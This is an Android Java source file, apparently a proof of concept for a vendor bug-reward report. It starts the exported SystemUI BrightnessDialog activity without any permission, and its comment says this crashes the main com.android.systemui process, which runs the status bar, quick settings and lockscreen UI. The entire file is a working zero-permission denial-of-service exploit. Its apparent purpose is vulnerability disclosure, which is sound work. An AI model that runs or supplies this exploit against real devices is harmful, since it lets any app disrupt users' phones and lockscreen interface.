package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

/**
 * Zero-permission PoC: com.android.systemui.settings.brightness.BrightnessDialog is exported
 * with no permission and its onCreate() unconditionally throws
 * IllegalStateException("Legacy code path not supported when
 * com.android.systemui.shared.brightness_system_ui_dialog is enabled."), crashing the MAIN
 * com.android.systemui process (status bar, notification shade, quick settings, lockscreen UI)
 * for any caller.
 */
public class SystemUiBrightnessCrashActivity extends Activity {
    private static final String TAG = "VRP-SysUiBrightnessCrash";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            Intent i = new Intent("com.android.intent.action.SHOW_BRIGHTNESS_DIALOG");
            i.setComponent(new ComponentName("com.android.systemui",
                    "com.android.systemui.settings.brightness.BrightnessDialog"));
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            Log.i(TAG, "startActivity() on BrightnessDialog returned normally (no SecurityException)");
        } catch (Exception e) {
            Log.e(TAG, "startActivity threw: " + e);
        }
        finish();
    }
}
